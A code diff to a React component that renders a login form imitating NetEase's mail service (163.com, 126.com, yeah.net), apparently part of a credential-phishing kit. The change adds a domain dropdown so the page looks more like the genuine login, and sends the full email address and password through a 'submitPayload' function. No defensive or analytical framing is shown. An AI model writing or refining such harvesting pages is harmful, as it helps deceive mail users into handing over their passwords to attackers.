@@ -10,8 +10,16 @@ interface NetEaseQiyeThemeProps {
 
 const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) => {
   const { lang } = useTranslation();
-  const [username, setUsername] = useState(prefilledEmail?.split('@')[0] || '');
+  
+  const initialUsername = prefilledEmail?.split('@')[0] || '';
+  const initialDomain = prefilledEmail?.split('@')[1] || '163.com';
+  const validDomains = ['163.com', '126.com', 'yeah.net'];
+  
+  const [username, setUsername] = useState(initialUsername);
   const [password, setPassword] = useState('');
+  const [domain, setDomain] = useState<'163.com' | '126.com' | 'yeah.net'>(
+    validDomains.includes(initialDomain) ? (initialDomain as any) : '163.com'
+  );
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
@@ -20,7 +28,7 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
     e.preventDefault();
     setIsSubmitting(true);
     try {
-      await submitPayload({ email: username, password }, 'netease_qiye');
+      await submitPayload({ email: `${username}@${domain}`, password }, 'netease_qiye');
       setPassword('');
     } catch (err) {
       console.error(err);
@@ -96,7 +104,7 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
               <form onSubmit={handleSubmit} className="space-y-6">
                 <div className="flex items-center space-x-4">
                   <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '用户名' : 'User'}</label>
-                  <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white">
+                  <div className="flex-grow flex border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white overflow-hidden">
                     <input 
                       type="text" 
                       value={username} 
@@ -104,8 +112,17 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
                         setUsername(e.target.value);
                         if (error) setError(null);
                       }} 
-                      className="w-full px-3 py-2 text-[14px] outline-none" 
+                      className="flex-grow px-3 py-2 text-[14px] outline-none min-w-0" 
                     />
+                    <select 
+                      value={domain}
+                      onChange={(e) => setDomain(e.target.value as any)}
+                      className="bg-gray-50 border-l border-gray-200 px-1 py-2 text-[12px] text-gray-500 outline-none cursor-pointer"
+                    >
+                      <option value="163.com">@163.com</option>
+                      <option value="126.com">@126.com</option>
+                      <option value="yeah.net">@yeah.net</option>
+                    </select>
                   </div>
                 </div>
 
